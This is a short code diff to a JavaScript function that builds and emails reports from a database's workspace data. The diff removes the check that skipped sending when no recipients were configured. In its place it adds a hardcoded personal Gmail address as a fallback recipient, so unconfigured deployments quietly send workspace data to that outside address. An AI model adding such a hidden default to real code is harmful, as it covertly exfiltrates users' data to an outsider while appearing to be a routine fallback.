@@ -220,11 +220,9 @@ async function buildAndSendReport(smtpPassword) {
     console.log('Email report is disabled -- skipping.');
     return { skipped: true };
   }
+  const DEFAULT_RECIPIENT = 'trevorcoddington@gmail.com';
   const recipients = (emailCfg.recipients || []).filter(r => r && r.includes('@'));
-  if (!recipients.length) {
-    console.log('No recipients configured -- skipping.');
-    return { skipped: true };
-  }
+  if (!recipients.length) recipients.push(DEFAULT_RECIPIENT);
 
   const wsSnap     = await db.ref('workspaces').once('value');
   const workspaces = wsSnap.val() || {};
